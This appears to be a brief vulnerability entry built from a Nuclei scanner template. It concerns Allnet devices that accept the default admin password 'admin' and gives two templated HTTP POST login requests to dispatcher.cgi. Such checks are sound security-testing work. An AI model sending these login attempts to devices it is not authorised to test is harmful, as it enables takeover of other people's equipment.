# Vulnerability: Allnet - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`allnet-default-login.yaml`)

## Description
Allnet contains a default login vulnerability. Default admin login password 'admin' was found.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /cgi-bin/dispatcher.cgi?cmd=1 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&login=1

POST /cgi-bin/dispatcher.cgi?cmd=3 HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&login=1
```

